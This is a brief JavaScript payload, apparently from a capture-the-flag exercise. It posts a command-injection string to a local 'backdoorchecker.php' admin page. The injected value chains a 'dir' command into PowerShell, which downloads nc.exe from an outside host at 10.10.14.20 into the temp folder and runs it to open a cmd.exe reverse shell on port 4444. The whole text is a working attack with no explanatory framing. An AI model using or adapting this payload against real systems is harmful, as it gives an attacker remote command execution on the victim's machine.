var request = new XMLHttpRequest();  

var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.20/nc.exe -outfile %temp%\\nc.exe"; %temp%\\nc.exe -e cmd.exe 10.10.14.20 4444';  

request.open('POST', 'http://localhost/admin/backdoorchecker.php', true); 
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); 
request.send(params); 
